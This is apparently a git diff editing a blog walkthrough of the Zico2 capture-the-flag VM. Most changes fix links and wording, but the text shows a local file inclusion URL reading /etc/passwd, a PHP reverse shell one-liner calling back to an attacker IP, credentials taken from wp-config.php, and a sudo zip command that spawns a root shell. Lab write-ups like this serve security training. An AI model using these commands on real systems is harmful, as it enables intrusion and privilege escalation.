@@ -127,7 +127,7 @@ Time to look around! Top header bar shows us 4 options - about, services, portfo
 
 <img src="/img/blog/zico2/Zico2.png">
 
-Interesting enough, the URL is possibly prone to *(Local File Inclusion)*[https://www.acunetix.com/blog/articles/local-file-inclusion-lfi/] from the looks of it. `http://192.168.1.17/view.php?page=../../../../etc/passwd` writes out the content of passwd file which proves the previous statement of possible LFI. Unfortunately LFI only allows us to read files, not upload them. Blindly browsing through the filesystem won't result in anything. I attempted many tricks such as *php://expect*, *php://filter*, */proc/self/environ* code execution to improve the current situation... Unfortunately, the results came out blank. Check [LFI cheathseet](https://highon.coffee/blog/lfi-cheat-sheet/) from HighOnCoffee if any of these things are unclear to you.
+Interesting enough, the URL is possibly prone to *[Local File Inclusion]*(https://www.acunetix.com/blog/articles/local-file-inclusion-lfi/) from the looks of it. `http://192.168.1.17/view.php?page=../../../../etc/passwd` writes out the content of passwd file which proves the previous statement of possible LFI. Unfortunately LFI only allows us to read files, not upload them. Blindly browsing through the filesystem won't result in anything. I attempted many tricks such as *php://expect*, *php://filter*, */proc/self/environ* code execution to improve the current situation... Unfortunately, the results came out blank. Check [LFI cheatsheet](https://highon.coffee/blog/lfi-cheat-sheet/) from HighOnCoffee if any of these things are unclear to you.
 
 LFI PoC:
 <img src="/img/blog/zico2/Zico3.png">      
@@ -214,17 +214,16 @@ shows us that there indeed is an exploitable [vulnerability](https://www.exploit
 
 # Exploitation
 
-If you read the searchsploit file, getting the shell will be easy. There are of course many ways to approach this vulnerability, but I chose the following:
+If you have read the searchsploit file, getting the shell will be easy. There are of course many ways to approach this vulnerability, but I chose the following:
 
-1. Make a txt file inside /var/www/html with `<?php $sock=fsockopen("192.168.1.12",1234);exec("/bin/sh -i <&3 >&3 2>&3");?>` as contents (this is our reverse shell - taken from [pentestmonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet))
+1. Make a txt file inside /var/www/html with `<?php $sock=fsockopen("192.168.1.12",1234);exec("/bin/sh -i <&3 >&3 2>&3");?>` (this is our reverse shell - taken from [pentestmonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet))
 2. Start an apache web server using `/etc/init.d/apache2 start`
 
-
-To proceed with our exploitation, do as the pdf says. Create a database with a .php extension (in my case shell.php):  
+To proceed with our exploitation, do as the exploitdb file says. Create a database with a .php extension (in my case shell.php):  
 
 <img src="/img/blog/zico2/Zico6.png">
 
-Add a table in it called shell with 1 field:      
+Add a table inside it called shell, select 1 field:      
 
 <img src="/img/blog/zico2/Zico7.png">
 
@@ -248,15 +247,15 @@ BOOM! A reverse connection has been made! :)
 
 # Privilege Escalation
 
-Time to snoop! (I stole that phrase from [g0blin](https://twitter.com/g0blinresearch) heh :P). There is nothing of interest inside /var and /tmp folders. All that remains is closer inspection of /home/zico/ which is present with many CMS files. 
+Time to snoop! (I stole that phrase from [g0blin](https://twitter.com/g0blinresearch) heh :P). There is nothing of interest inside **/var/** and **/tmp/** folders. All that remains is closer inspection of /home/zico/ which is present with many CMS files. 
 
 <img src="/img/blog/zico2/Zico10.png">
 
-After some exploration I discovered a wp-config.php file which is present with zico's login credentials.
+After some exploration I discovered a wp-config.php (inside **/wordpress/**) file which has zico's login credentials.
 
 <img src="/img/blog/zico2/Zico11.png"> 
 
-Use them to connect via ssh `ssh zico@192.168.1.17` and enumerate more with a nice TTY shell and job control. `sudo -l` shows that we can use zip or tar combined with sudo without providing a password. 
+Use them to connect via ssh: `ssh zico@192.168.1.17` and enumerate more with a nice TTY shell and job control. `sudo -l` shows that we can use zip or tar combined with sudo without providing a password. 
 
 <img src="/img/blog/zico2/Zico12.png">
 
@@ -269,7 +268,7 @@ zico@zico:/tmp$ sudo zip exploit.zip exploit -T --unzip-command="python -c 'impo
 
 `sudo - executes as superuser`
 
-`-T - check the file integrity, needs to do some operations which will also execute the next argument --unzip-command (this command grants us a shell)
+`-T - check the file integrity, needs to do some operations which will also execute the next argument --unzip-command (this command grants us a shell)`
 
 `--unzip-command="python -c 'import pty; pty.spawn(\"/bin/sh\")'" - spawns a /bin/sh shell`
 
@@ -278,7 +277,7 @@ zico@zico:/tmp$ sudo zip exploit.zip exploit -T --unzip-command="python -c 'impo
 
 
 # Conclusion
-Sorry for making this blog so lenghty! Sure, it was a long read, but I hope you atleast learnt a thing or two. Props to the author - (Rafael)[https://twitter.com/rafasantos5] for making such an awesome machine. It sure was fun!
+Sorry for making this blog so lenghty! Sure, it was a long read, but I hope you atleast learnt a thing or two. Props to the author - [Rafael](https://twitter.com/rafasantos5) for making such an awesome machine. It sure was fun!
 
-If you have any comments or questions feel free to reach out to me. 
+If you have any questions feel free to reach out to me via my [contact page](https://v3ded.github.io/contact/) or comments below.  
 ~V3 
